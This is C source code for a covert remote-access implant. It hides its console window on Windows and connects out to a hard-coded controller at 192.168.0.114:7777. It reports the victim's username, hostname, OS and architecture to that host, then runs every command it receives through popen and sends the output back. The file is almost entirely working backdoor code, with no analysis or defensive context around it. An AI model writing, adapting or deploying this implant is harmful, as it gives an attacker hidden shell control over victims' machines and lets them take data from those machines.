#include "fonction.h"

int main() {
#ifdef _WIN32
    FreeConsole();
#endif
    const char *ipTarget = "192.168.0.114";
    const unsigned int PORT = 7777;
    char buffer_send[8192] = "";
    char command_rcv[8192] = "";
    unsigned int checkOS = 0;
    FILE *fp = nullptr;
    SocketType sock = Connect(ipTarget, PORT);

#ifdef _WIN32
    checkOS = 1;
#elif defined(__unix__)
    checkOS = 0;
#else
    checkOS = 3;
#endif

    snprintf(buffer_send, sizeof(buffer_send), "%u", checkOS);

    send(sock, buffer_send, sizeof(buffer_send), 0);
    usleep(100000);

    if (checkOS == 3) {
	    CloseSocket(sock);
	    CloseConnect();
        exit(1);
    }

#ifdef _WIN32
    sprintf(buffer_send, "%s|%s|%s %s|%s|%s", GetUsername(WINDOWS), GetHostname_WINDOWS(), GetOSVersion_WINDOWS(), "Unknow", GetArchitecture_WINDOWS());
    send(sock, buffer_send, sizeof(buffer_send), 0);
#elif defined(__unix__)
    struct utsname info;
    uname(&info);

    sprintf(buffer_send, "%s|%s|%s %s|%s|%s", GetUsername(UNIX), GetHostname_UNIX(), info.sysname, info.version, info.release, info.machine);
    send(sock, buffer_send, sizeof(buffer_send), 0);
#endif

    while (TRUE) {
        memset(buffer_send, 0, sizeof(buffer_send));

        if (recv(sock, command_rcv, sizeof(command_rcv), 0) == 0) {
            CloseSocket(sock);
            CloseConnect();
            return 0;
        }

        if(strcmp(command_rcv, "exit") == 0) {
            CloseSocket(sock);
            CloseConnect();
            return 0;
        }

        if (strcmp(command_rcv, "reload") == 0) {
#ifdef _WIN32
            sprintf(buffer_send, "%s|%s|%s|%s|%s", GetUsername(WINDOWS), GetHostname_WINDOWS(), GetOSVersion_WINDOWS(), "Unknow", GetArchitecture_WINDOWS());
#elif defined(__unix__)
            sprintf(buffer_send, "%s|%s|%s %s|%s|%s", GetUsername(UNIX), GetHostname_UNIX(), info.sysname, info.version, info.release, info.machine);
#endif
            send(sock, buffer_send, sizeof(buffer_send), 0);
            continue;
        }

        fp = popen(command_rcv, "r");
        size_t totalRead = 0;
        size_t bytesRead;
        while ((bytesRead = fread(buffer_send + totalRead, 1, 4096 - totalRead, fp)) > 0) {
            totalRead += bytesRead;
        }
        pclose(fp);

        if (strlen(buffer_send) > 0) {
            send(sock, buffer_send, sizeof(buffer_send), 0);
        } else {
            strcpy(buffer_send, "C 3$t v1d3");
            send(sock, buffer_send, sizeof(buffer_send), 0);
        }
        usleep(100000);
    }
}